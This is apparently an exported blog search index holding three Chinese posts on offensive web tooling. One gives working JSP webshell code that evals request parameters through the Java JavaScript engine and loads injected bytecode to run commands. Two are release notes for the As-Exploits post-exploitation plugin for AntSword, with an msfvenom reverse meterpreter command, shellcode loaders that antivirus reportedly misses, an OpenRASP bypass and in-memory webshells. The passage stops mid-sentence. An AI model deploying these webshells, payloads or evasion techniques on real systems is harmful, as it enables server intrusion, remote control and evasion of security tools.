<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[一种新型Java一句话木马的实现]]></title>
    <url>%2Fposts%2F%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8BJava%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[本文首发于先知社区前言一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。基本原理Java没有eval函数，Js有eval函数，可以把字符串当代码解析。Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。ScriptEngine支持在Js中调用Java的对象。综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。获取脚本引擎123456//通过脚本名称获取：ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;JavaScript&quot;); //简写为js也可以//通过文件扩展名获取： ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(&quot;js&quot;); //通过MIME类型来获取： ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(&quot;text/javascript&quot;);绑定对象1234ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);engine.put(&quot;request&quot;, request);engine.put(&quot;response&quot;, response);engine.eval(request.getParameter(&quot;mr6&quot;));或者通过eval的重载函数，直接把对象通过一个HashMap放进去1234new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;ant&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123;put(&quot;response&quot;, response);put(&quot;request&quot;, request);&#125;&#125;))eval综合上面两步，有很多种写法，例如：shell.jsp12345678&lt;% javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;); engine.put(&quot;request&quot;, request); engine.put(&quot;response&quot;, response); engine.eval(request.getParameter(&quot;mr6&quot;));%&gt;或者直接缩写成一句：123456&lt;% new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;).eval(request.getParameter(&quot;mr6&quot;), new javax.script.SimpleBindings(new java.util.HashMap() &#123;&#123; put(&quot;response&quot;, response); put(&quot;request&quot;, request); &#125;&#125;));%&gt;以执行命令为例：POST：mr6=java.lang.Runtime.getRuntime().exec(“calc”);即可达到命令执行的效果。基本语法翻阅文档比较枯燥，这里挑一些用到的说一说。感兴趣的同学也可以看一下原文档：https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf调用Java方法前面加上全限定类名即可12345678var s = [3];s[0] = &quot;cmd&quot;;s[1] = &quot;/c&quot;;s[2] = &quot;whoami&quot;;//yzddmr6var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),&quot;GBK&quot;).useDelimiter(&quot;\\A&quot;);var result = sc.hasNext() ? sc.next() : &quot;&quot;;sc.close();导入Java类型123456var Vector = java.util.Vector;var JFrame = Packages.javax.swing.JFrame; //这种写法仅仅支持Nashorn，Rhino并不支持var Vector = Java.type(&quot;java.util.Vector&quot;)var JFrame = Java.type(&quot;javax.swing.JFrame&quot;)创建Java类型的数组12345678// Rhinovar Array = java.lang.reflect.Arrayvar intClass = java.lang.Integer.TYPEvar array = Array.newInstance(intClass, 8)// Nashornvar IntArray = Java.type(&quot;int[]&quot;)var array = new IntArray(8)导入Java类默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。这个时候大聪明Mozilla Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。importClass 导入指定Java的类，现在推荐用Java.typeimportPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。1234567load(&quot;nashorn:mozilla_compat.js&quot;);importClass(java.util.HashSet);var set = new HashSet();importPackage(java.util);var list = new ArrayList();在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。1234567891011// create JavaImporter with specific packages and classes to importvar SwingGui = new JavaImporter(javax.swing, javax.swing.event, javax.swing.border, java.awt.event);with (SwingGui) &#123; // 在with里面才可以调用swing里面的类，防止污染 var mybutton = new JButton(&quot;test&quot;); var myframe = new JFrame(&quot;test&quot;);&#125;方法调用与重载方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：123var System = Java.type(&apos;java.lang.System&apos;);System.out.println(&apos;Hello, World&apos;); // Hello, WorldSystem.out[&apos;println&apos;](&apos;Hello, World&apos;); // Hello, WorldJava支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：1234var System = Java.type(&apos;java.lang.System&apos;);System.out[&apos;println&apos;](3.14); // 3.14System.out[&apos;println(double)&apos;](3.14); // 3.14System.out[&apos;println(int)&apos;](3.14); // 3Payload结构设计详情写在注释里了1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//导入基础拓展try &#123; load(&quot;nashorn:mozilla_compat.js&quot;);&#125; catch (e) &#123;&#125;//导入常见包importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);var output = new StringBuffer(&quot;&quot;); //输出var cs = &quot;$&#123;jspencode&#125;&quot;; //设置字符集编码var tag_s = &quot;$&#123;tag_s&#125;&quot;; //开始符号var tag_e = &quot;$&#123;tag_e&#125;&quot;; //结束符号try &#123; response.setContentType(&quot;text/html&quot;); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); function decode(str) &#123; //参数解码 str = str.substr(2); var bt = Base64DecodeToByte(str); return new java.lang.String(bt, cs); &#125; function Base64DecodeToByte(str) &#123; importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try &#123; bt = new BASE64Decoder().decodeBuffer(str); &#125; catch (e) &#123; bt = Base64.getDecoder().decode(str); &#125; return bt; &#125; function asoutput(str) &#123; //回显加密 return str; &#125; function func(z1) &#123; //eval function return z1; &#125; output.append(func(z1)); //添加功能函数回显&#125; catch (e) &#123; output.append(&quot;ERROR:// &quot; + e.toString()); //输出错误&#125;try &#123; response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e); //回显&#125; catch (e) &#123;&#125;语法问题的坑两种语言对象间的相互转换要注意的是，在遇到Java跟JS可能存在类型冲突的地方，即使导入了包也要加上全限定类名。在编写payload的时候被坑了很久的一个问题就是，在导入java.lang以后写new String(bt,cs)没有加全限定类名，导致打印出来的一直是一个字符串地址。正确的操作是new java.lang.String(bt,cs)。因为在Java和Js中均存在String类，按照优先级，直接new出来的会是Js的对象。下面附上类型对比表：JavaScript ValueJavaScript TypeJava TypeIs ScriptableIs Function{a:1, b:[‘x’,‘y’]}objectorg.mozilla.javascript.NativeObject+-[1,2,3]objectorg.mozilla.javascript.NativeArray+-1numberjava.lang.Double--1.2345numberjava.lang.Double--NaNnumberjava.lang.Double--Infinitynumberjava.lang.Double---Infinitynumberjava.lang.Double--truebooleanjava.lang.Boolean--“test”stringjava.lang.String--nullobjectnull--undefinedundefinedorg.mozilla.javascript.Undefined--function () { }functionorg.mozilla.javascript.gen.c1++/.*/objectorg.mozilla.javascript.regexp.NativeRegExp++Rhino/Nashorn解析的差异这也是当时一个坑点，看下面一段代码1234567891011121314151617var readonlyenv = System.getenv();var cmdenv = new java.util.HashMap(readonlyenv);var envs = envstr.split(&quot;\\|\\|\\|asline\\|\\|\\|&quot;);for (var i = 0; i &lt; envs.length; i++) &#123; var es = envs[i].split(&quot;\\|\\|\\|askey\\|\\|\\|&quot;); if (es.length == 2) &#123; cmdenv.put(es[0], es[1]); &#125;&#125;var e = [];var i = 0;print(cmdenv+&apos;\n&apos;);for (var key in cmdenv) &#123;//关键 print(&quot;key: &quot;+key+&quot;\n&quot;); e[i] = key + &quot;=&quot; + cmdenv[key]; i++;&#125;其中cmdenv是个HashMap，这段代码在Java 8中Nashorn引擎可以正常解析，var key in cmdenv的时候把cmdenv的键给输出了但是在Java 6下运行时，Rhino把他当成了一个js对象，把其属性输出了所以涉及到这种混合写法就会有异议，不同的引擎有不同的解释。解决办法使用Java迭代器即可，不掺杂js的写法。12345678910var i = 0;var iter = cmdenv.keySet().iterator();while (iter.hasNext()) &#123; var key = iter.next(); var val = cmdenv.get(key); //print(&quot;\nkey:&quot; + key); //print(&quot;\nval:&quot; + val); e[i] = key + &quot;=&quot; + val; i++;&#125;反射的坑在Java中，如果涉及到不同版本之间类的包名不一样，我们通常不能直接导入，而要使用反射的写法。例如base64解码的时候，Java的写法如下1234567891011121314151617public byte[] Base64DecodeToByte(String str) &#123; byte[] bt = null; String version = System.getProperty(&quot;java.version&quot;); try &#123; if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123; Class clazz = Class.forName(&quot;java.util.Base64&quot;); Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null); bt = (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str); &#125; else &#123; Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;); bt = (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str); &#125; return bt; &#125; catch (Exception e) &#123; return new byte[]&#123;&#125;; &#125;&#125;改写成js风格后，发现会有一些奇奇怪怪的BUG。（后来发现反射其实也可以实现，导入Java类型然后再传入反射参数即可，就是比较麻烦）12345678910111213141516171819function test(str) &#123; var bt = null; var version = System.getProperty(&quot;java.version&quot;); if (version.compareTo(&quot;1.9&quot;) &gt;= 0) &#123; var clazz = java.lang.Class.forName(&quot;java.util.Base64&quot;); var decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null); bt = decoder .getClass() .getMethod(&quot;decode&quot;, java.lang.String.class) .invoke(decoder, str); &#125; else &#123; var clazz = java.lang.Class.forName(&quot;sun.misc.BASE64Decoder&quot;); bt = clazz .getMethod(&quot;decodeBuffer&quot;, java.lang.String.class) .invoke(clazz.newInstance(), str); &#125; return bt;&#125;但是在Js中，我们并不需要这么麻烦。上面提到过如果importPackage了一个不存在的包名，Js引擎会将这个错误给忽略，并且由于Js松散的语言特性，我们仅仅需要正射+异常捕获就可以完成目的。大大减小了payload编写的复杂度。1234567891011function Base64DecodeToByte(str) &#123; importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try &#123; bt = new BASE64Decoder().decodeBuffer(str); &#125; catch (e) &#123; bt = Base64.getDecoder().decode(str); &#125; return bt;&#125;保底操作理论上，我们可以用js引擎的一句话实现所有字节码一句话的功能，退一万步讲，如果有些功能实在不好实现，或者说想套用现有的payload应该怎么办呢。我们可以用java调用js后，再调用defineClass来实现：编写一个命令执行的类：calc.java1234567891011import java.io.IOException;public class calc &#123; public calc(String cmd)&#123; try &#123; Runtime.getRuntime().exec(cmd); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125;编译之后base64一下12&gt; base64 -w 0 calc.classyv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIA填入下方payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748try &#123; load(&quot;nashorn:mozilla_compat.js&quot;);&#125; catch (e) &#123;&#125;importPackage(Packages.java.util);importPackage(Packages.java.lang);importPackage(Packages.java.io);var output = new StringBuffer(&quot;&quot;);var cs = &quot;UTF-8&quot;;response.setContentType(&quot;text/html&quot;);request.setCharacterEncoding(cs);response.setCharacterEncoding(cs);function Base64DecodeToByte(str) &#123; importPackage(Packages.sun.misc); importPackage(Packages.java.util); var bt; try &#123; bt = new BASE64Decoder().decodeBuffer(str); &#125; catch (e) &#123; bt = new Base64().getDecoder().decode(str); &#125; return bt;&#125;function define(Classdata, cmd) &#123; var classBytes = Base64DecodeToByte(Classdata); var byteArray = Java.type(&quot;byte[]&quot;); var int = Java.type(&quot;int&quot;); var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod( &quot;defineClass&quot;, byteArray.class, int.class, int.class ); defineClassMethod.setAccessible(true); var cc = defineClassMethod.invoke( Thread.currentThread().getContextClassLoader(), classBytes, 0, classBytes.length ); return cc.getConstructor(java.lang.String.class).newInstance(cmd);&#125;output.append( define( &quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;, &quot;calc&quot; ));response.getWriter().print(output);成功弹出计算器也就是说，新型一句话在特殊情况下，还可以继续兼容原有的字节码一句话，甚至复用原有的Payload。测试测试环境：Java&gt;=6同样的列目录Payload，原有的字节码方式数据包长度为7378，而新型JSP一句话仅仅为2481，差不多为原有的三分之一。列目录中文测试虚拟终端数据库连接最后基于JS引擎的Java一句话体积更小，变化种类更多，使用起来更灵活。范围为Java 6及以上，基本可以满足需求，但是Payload写起来非常麻烦，也不好调试，算是有利有弊。提出新型一句话并不是说一定要取代原有的打入字节码的方式，只是在更复杂情况下，可以提供给渗透人员更多的选择。项目地址：https://github.com/AntSwordProject/antSword/commit/a6efa86f5959204140d73092b010fe0739208385]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits v1.3更新]]></title>
    <url>%2Fposts%2Fas-exploits-v13-update%2F</url>
    <content type="text"><![CDATA[更新主要内容v 1.3 (2021/5/14)equals支持数组传参方式，兼容各种容器jsp新增 ShellCode加载器模块，内置两种分别基于jna跟java agent的shellcode加载方式jsp新增 Bypass OpenRASP 模块，thx@GodzillaJarLoader模块 新增手动上传方式，解决因Tomcat最大POST长度为2m导致无法加载内存Jar的问题reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits冰蝎内存马支持3.7，去除pageContext依赖，兼容Spring等容器各模块兼容JDK5挑几个重点的说说Shell入口参数支持数组形式Shell入口参数即下面new Object[]{request,response}的部分。123456&lt;% String cls = request.getParameter(&quot;ant&quot;); if (cls != null) &#123; new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]&#123;request,response&#125;); &#125;%&gt;至于为什么要改这个玩意要从内存马的兼容说起。除了由于写法问题而导致的各种乱七八糟的问题以外，连接内存马的一个主要问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西，并且在SpringBoot这种容器里根本没有pageContext这个类。于是就有跟多师傅提出了自己的解决办法，大体分为三种：自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。冰蝎改造之不改动客户端=&gt;内存马。改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。冰蝎改造之适配基于tomcat Filter的无文件webshell采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell以上的这些方法可以是可以，但是不够优雅。回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。request是接收参数，response是回显，两者缺一不可。后来自己调试的时候发现在request中本身就包含了当前的response，同样response中也包含了当前的request。当时就想着我shell中传个request，然后在payload里面利用反射把requst里面的response取出来，或者response里面的request取出来不就完事了？这样确实可以，在2020年9月4日，勤劳的我一大早就起来写了一波代码，然后发了上去，commit记录可以证明我没有瞎bb。当时蚁剑算是最早兼容内存马的。因为Tomcat喜欢用门面模式，所以要反射两层，结果后来发现在WebLogic下用不了了，因为WebLogic不喜欢搞门面模式，只需要反射一层就够了。行吧，那我就再加一种情况，在JSP V1.4版本又增加了一层反射的情况。本来以为没事了，后来又发现在有shiro的情况下打一个servlet内存马进去，这时候去连接内存马需要反射三次？？WTF？？？然后意识到，这种case by case的解决方式是不行的，世界上还有那么多种Web容器中间件，不可能一个一个去调吧。所以为了彻底解决这个问题，在520师傅的建议下采用了数组的方式将两者直接传进去，把分析的逻辑放在打内存Shell的时候去做，而不在payload里面去做。现在冰蝎跟哥斯拉也都有了相应的机制，思路大体是一样的，感兴趣的小伙伴可以自己研究一下。JarLoader模块新增手动上传方式内存加载直接通过HTTP包将Jar打入目标内存，仅需选择本地需要上传的Jar文件即可，期间文件不落地。但是Tomcat默认POST最大上传大小为2M，如果超过了此大小请选择手动上传模式。手动上传先手动将Jar上传到目标服务器上，然后通过路径加载。JSP ShellCode加载器内置两种加载方式，使用之前请务必认真阅读使用说明，否则可能直接将Java进程打挂。需要注意两点：使用MSF需要加上PrependMigrate=true PrependMigrateProc=xxxx.exe参数，自动迁移到新的进程，否则会在migrate/exit的时候把Java进程给干掉，导致网站瘫痪。例如：msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.129 LPORT=8888 PrependMigrate=true PrependMigrateProc=svchost.exe -f hexJNA方式只需要X86类型的ShellCode即可，而Attach方式需要根据目标Java位数来选择对应的ShellCode。JNA方式利用第三方库JNA进行ShellCode的加载。适用范围：JDK&gt;=1.5正确操作首先利用Jar加载器将ShellCodeLoader.jar上传到目标服务器目录并加载。使用MSF或者CS生成x86类型的shellcode，并开启监听。在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。点击exploit，等待返回回话。JNA方式测试装了360，火绒，电脑管家上传插件ext目录下的ShellcodeLoader.jar到目标服务器，然后复制文件路径手动加载到JVM中MSF生成Shellcode选择JNA方式，exploit!直接上线，杀软没有拦截关于jna会生成一个临时文件的问题，发现确实会生成一个dll临时文件在Tomcat临时目录下但是扫了一下发现是免杀的VT检测结果0/68，也就是说落地也问题不大。不过可能这篇文章出来之后就没了Attach模拟java agent注入过程来实现Shellcode的加载。这个native方法是jdk自带的，并且经过oracle签名的，理论上免杀效果更好。适用范围：JDK&gt;=1.6正确操作基本信息，exploit，Ctrl+F 搜索 sun.arch.data.model，查看java位数根据java位数生成对应位数的shellcode，并开启监听。在ShellCode加载器模块，输入hex或者java格式的shellcode，且不能有多余换行跟空格。点击exploit，等待返回回话。Attach方式测试发现是64位javaCS生成对应位数的shellcode，选择java格式导出。粘贴到插件中，在exploit的一刻会自动格式化为hex直接上线，杀软没有拦截。一键Bypass OpenRASP借鉴自哥斯拉的插件：Godzilla-BypassOpenRasp一键绕过OpenRASP目标安装有OpenRASP且开启命令执行拦截exploit!再次运行，即可执行命令其他reGeorg内存马改为更稳定的neo-reGerog，默认密码：asexploits冰蝎内存马去除pageContext依赖，兼容Spring等容器各模块兼容JDK5项目地址https://github.com/yzddmr6/As-Exploits来颗star吧~]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits v1.2更新]]></title>
    <url>%2Fposts%2Fas-exploits-v12-update%2F</url>
    <content type="text"><![CDATA[前言As-Exploits，中国蚁剑后渗透模块。目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。其中Payload部分很多借鉴了冰蝎跟哥斯拉的实现，向其开发者们表示感谢！支持列表模块名称\Shell类型PHPASPXJSP基本信息√√√反弹Shell√√√内存马√内存马管理√杀软识别√√√提权辅助√√√屏幕截图√√ShellCode加载器√Jar加载器√本次更新主要内容aspx增加屏幕截图模块我打我自己当然实战中需要较高权限。因为在Jscript加载Assembly踩坑记里面解决了Jscript加载c#的问题，所以C#的payload理论上都可以加进去，更多其他的用法就看大家自己发挥了jsp增加Jar加载器模块打一个jar进去通常有两个用处：一是可以用来上传数据库驱动。二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。冰蝎冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver12345678910111213141516171819202122232425262728293031323334353637383940414243444546private void loadDriver(String scriptType, String databaseType) throws Exception &#123; String driverPath = &quot;net/rebeyond/behinder/resource/driver/&quot;; Platform.runLater(() -&gt; &#123; this.statusLabel.setText(&quot;正在上传数据库驱动……&quot;); &#125;); String os = this.currentShellService.shellEntity.getString(&quot;os&quot;).toLowerCase(); //根据系统型号选择临时目录 String remoteDir = os.indexOf(&quot;windows&quot;) &gt;= 0 ? &quot;c:/windows/temp/&quot; : &quot;/tmp/&quot;; String libName = null; if (scriptType.equals(&quot;jsp&quot;)) &#123; //根据类型选择数据库jdbc if (databaseType.equals(&quot;sqlserver&quot;)) &#123; libName = &quot;sqljdbc41.jar&quot;; &#125; else if (databaseType.equals(&quot;mysql&quot;)) &#123; libName = &quot;mysql-connector-java-5.1.36.jar&quot;; &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123; libName = &quot;ojdbc5.jar&quot;; &#125; &#125; else if (scriptType.equals(&quot;aspx&quot;)) &#123; if (databaseType.equals(&quot;mysql&quot;)) &#123; libName = &quot;mysql.data.dll&quot;; &#125; else if (databaseType.equals(&quot;oracle&quot;)) &#123; libName = &quot;Oracle.ManagedDataAccess.dll&quot;; &#125; &#125; byte[] driverFileContent = Utils.getResourceData(driverPath + libName); String remotePath = remoteDir + libName; //将jar先上传到临时目录 this.currentShellService.uploadFile(remotePath, driverFileContent, true); Platform.runLater(() -&gt; &#123; this.statusLabel.setText(&quot;驱动上传成功，正在加载驱动……&quot;); &#125;); //将libPath传递给服务端加载 JSONObject loadRes = this.currentShellService.loadJar(remotePath); if (loadRes.getString(&quot;status&quot;).equals(&quot;fail&quot;)) &#123; throw new Exception(&quot;驱动加载失败:&quot; + loadRes.getString(&quot;msg&quot;)); &#125; else &#123; Platform.runLater(() -&gt; &#123; if (scriptType.equals(&quot;jsp&quot;)) &#123; this.statusLabel.setText(&quot;驱动加载成功，请再次点击“连接”。&quot;); &#125; this.statusLabel.setText(&quot;驱动加载成功。&quot;); &#125;); &#125; &#125;webshell获取到libPath然后用URLClassLoader去加载。net.rebeyond.behinder.payload.java.Loader哥斯拉哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。创建了一种新的协议jarmembuff然后把收到的jar文件的字节数组给放到变量里。这样就实现了文件不落地，将jar打入内存的目的。本人在As-Exploits里也采用了这种做法。小实验这里做一个小实验写一个弹框测试类123456789101112import java.io.IOException;public class calc &#123; public calc() &#123; try &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125; catch (IOException var2) &#123; var2.printStackTrace(); &#125; &#125;&#125;jar -cvf打包成jar开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。12345&lt;% Class.forName(&quot;calc&quot;).newInstance();%&gt;在第一次访问的时候找不到这个类肯定会报错然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。exploit！再去刷新页面，弹出计算器。支持返回包加密选择reverse解码器返回包数据内存马兼容Spring其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：yzddmr6.tk。这里有两个细节关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误：115e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c定位一下问题出在这里意思就是在StandardContext中找不到removeChild这个方法。调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别：getMethods 获取所有公有方法（包括父类方法）getDeclaredMethods 获取本类中的所有方法 (只拿本类中的)哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。在内存马模块同理，这里直接全部改了，不再用反射。addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果：tomcat7 只能addServletMappingtomcat8 addServletMapping/addServletMappingDecoded都可以tomcat9 